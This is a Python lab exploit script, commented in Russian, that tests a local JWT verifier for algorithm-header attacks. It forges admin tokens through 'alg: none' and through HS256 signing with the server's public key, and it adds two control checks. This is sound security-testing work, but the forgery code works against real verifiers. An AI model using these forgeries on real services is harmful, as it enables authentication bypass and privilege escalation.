"""Эксплойт лабы jwt-attacks: подмена способа проверки через заголовок.

Проверяющий читает alg из токена. Значит, предъявитель управляет проверкой:
объявляет none — и подпись не сверяют; объявляет HS256 и подписывает открытым
ключом сервера — и HMAC сходится. Оба обхода дают роль admin без закрытого
ключа.

Локально, к сети не обращается, против чужих систем неприменимо.

Код возврата:
    0 — эксплойт НЕ сработал (алгоритм не берётся из токена)
    1 — эксплойт сработал (роль admin без ключа сервера)
"""

import base64
import hashlib
import hmac
import json
import sys

from labtarget import load


def _b64u(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def experiment_1_alg_none(lab):
    """alg=none: токен объявляет, что подписи нет."""
    header = _b64u(json.dumps({"alg": "none", "typ": "JWT"},
                              separators=(",", ":")).encode())
    payload = _b64u(json.dumps({"sub": "wiener", "role": "admin"},
                               separators=(",", ":")).encode())
    forged = f"{header}.{payload}."
    role = lab.authorize(forged)
    got = role == "admin"
    print(f"  опыт 1 — alg=none, подпись пустая: "
          f"{'РОЛЬ ADMIN БЕЗ ПОДПИСИ' if got else 'отвергнут'}")
    return got


def experiment_2_confusion(lab):
    """HS/RS confusion: открытый ключ сервера как секрет HMAC."""
    pub_pem = lab.public_key_pem()
    header = _b64u(json.dumps({"alg": "HS256", "typ": "JWT"},
                              separators=(",", ":")).encode())
    payload = _b64u(json.dumps({"sub": "wiener", "role": "admin"},
                               separators=(",", ":")).encode())
    sig = _b64u(hmac.new(pub_pem, f"{header}.{payload}".encode(),
                         hashlib.sha256).digest())
    forged = f"{header}.{payload}.{sig}"
    role = lab.authorize(forged)
    got = role == "admin"
    print(f"  опыт 2 — HS256 на открытом ключе сервера: "
          f"{'РОЛЬ ADMIN БЕЗ ЗАКРЫТОГО КЛЮЧА' if got else 'отвергнут'}")
    return got


def experiment_3_control_honest(lab):
    """Контроль: честный RS256 по-прежнему даёт свою роль."""
    role = lab.authorize(lab.issue("wiener", "user"))
    ok = role == "user"
    print(f"  опыт 3 — контроль, честный RS256 wiener: "
          f"{'роль user' if ok else 'ПОЧИНКА СЛОМАЛА ВХОД'}")
    return ok


def experiment_4_control_tamper(lab):
    """Контроль: подмена роли в честном токене без ключа отвергается."""
    token = lab.issue("wiener", "user")
    head, payload, sig = token.split(".")
    claims = json.loads(base64.urlsafe_b64decode(payload + "=="))
    claims["role"] = "admin"
    forged_payload = _b64u(json.dumps(claims, separators=(",", ":")).encode())
    forged = f"{head}.{forged_payload}.{sig}"
    role = lab.authorize(forged)
    ok = role != "admin"
    print(f"  опыт 4 — контроль, подмена role в RS256 без ключа: "
          f"{'отвергнута' if ok else 'ПРИНЯТА — подпись не проверяется'}")
    return ok


def main() -> int:
    name, lab = load()
    print(f"Цель: {name}")
    lab.reset()
    hits = [experiment_1_alg_none(lab), experiment_2_confusion(lab)]
    controls = [experiment_3_control_honest(lab), experiment_4_control_tamper(lab)]
    print()
    if any(hits):
        print("ЭКСПЛОЙТ СРАБОТАЛ: способ проверки выбран заголовком токена "
              f"({sum(hits)} из 2 опытов)")
        return 1
    if not all(controls):
        print("ЭКСПЛОЙТ НЕ СРАБОТАЛ, но контроль упал: проверка сломана")
        return 1
    print("эксплойт не сработал: алгоритм не берётся из токена, "
          "честные токены проходят, подмена отвергнута")
    return 0


if __name__ == "__main__":
    sys.exit(main())
